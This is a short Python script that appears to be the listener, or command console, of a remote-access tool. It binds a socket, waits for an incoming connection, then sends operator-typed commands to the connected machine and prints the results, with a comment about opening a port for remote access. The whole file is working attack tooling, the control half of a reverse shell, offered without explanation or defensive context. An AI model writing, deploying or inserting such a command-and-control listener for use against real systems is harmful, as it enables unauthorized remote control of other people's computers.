import socket
import sys
import os

host = ""  # Your local IP
port = 10000  # If you want to get remote access you must put an open port
client = socket.socket()


def socket_bind():
    try:
        print("Creating server...")
        client.bind((host, port))
        client.listen()
        print("Server created.")
    except socket.error as e:
        print(f"Error: {e}\nRetrying")
        socket_bind()


def socket_accept():
    print("Waiting for connections..")
    conn, address = client.accept()
    print(f"Connection has been established | IP {address[0]} | Port {address[1]}")
    send_commands(conn)
    conn.close()


def send_commands(conn):
    print(conn.recv(1024).decode("utf-8", errors="ignore"), end="")
    while True:
        cmd = input(">")
        if cmd == "quit":
            conn.close()
            client.close()
            sys.exit()
        if cmd == "cls":
            os.system("cls")
        if len(cmd) > 0:
            conn.send(cmd.encode())
            print(conn.recv(1024).decode("utf-8", errors="ignore"), end="")


if __name__ == '__main__':
    socket_bind()
    socket_accept()
